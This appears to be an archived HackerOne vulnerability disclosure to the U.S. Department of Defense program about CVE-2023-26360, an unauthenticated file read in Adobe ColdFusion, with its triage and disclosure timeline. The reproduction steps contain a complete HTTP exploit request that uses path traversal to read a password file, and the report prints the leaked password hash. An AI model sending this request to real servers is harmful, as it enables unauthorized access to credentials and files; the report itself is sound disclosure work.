---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2026-01-12
submitted: 2024-11-29T15:04:48.266Z
bounty_usd: null
votes: 7
cve: "CVE-2023-26360"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "silentbreach"
source: "https://hackerone.com/reports/2870951"
title: "Unauthenticated File Read Adobe ColdFusion"
---
# Unauthenticated File Read Adobe ColdFusion

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2026-01-12

- Report: [https://hackerone.com/reports/2870951](https://hackerone.com/reports/2870951)
- CWE: Improper Access Control - Generic | CVE: CVE-2023-26360
- Submitted: 2024-11-29T15:04:48.266Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi DOD,

I have found CVE-2023-26360 in ███. It leads to an Unauthenticated Arbitrary File Read vulnerability due to the de serialization of untrusted data in Adobe ColdFusion. The password **hash** is disclosed: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`


## References

- https://hackerone.com/reports/2248781

## Impact

The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.

## System Host(s)
afit.edu

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2023-26360

## Steps to Reproduce
1. Open Burpsuite set the target to ████
2. Use the exploit below:
```bash
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/2
Host: ██████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
```
3. The password hash is disclosed in the response: `password=1B3C0648D519755588B7CE5BDBFD4A88E6C7998AF32309665E6966932720F3BA`

## POC Video

████████

## Suggested Mitigation/Remediation Actions
Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.

## Timeline

- **Report Filed**
- **2024-11-29** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2025-01-14** @silentbreach: Hi ██████████ - Any updates?
- **2025-01-16** @marmelade321: Greetings,

 We will update the report when we receive an update. Thank you for supporting the program.
- **Report Resolved**
- **2025-02-14** @silentbreach: Hi ████████ - Great news! Can we disclose?
- **Agreed On Going Public**
- **2025-03-04** @silentbreach: Hello VDP Team,

Can we please disclose this vulnerability so we can continue and find more 0-days? 

Thank you!
- **2025-03-17** @silentbreach: Hi ███ , ████ - Hope you're doing great. Any updates? Can we disclose? Thanks.
- **2025-04-08** @silentbreach: Hi ████ , ████ - I hope you're doing awesome today. Can we disclose this report? Thanks.
- **2025-05-12** @silentbreach: Hi ████████ , ██████ - I hope you're doing great today. Can we disclose this report? Thanks.
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
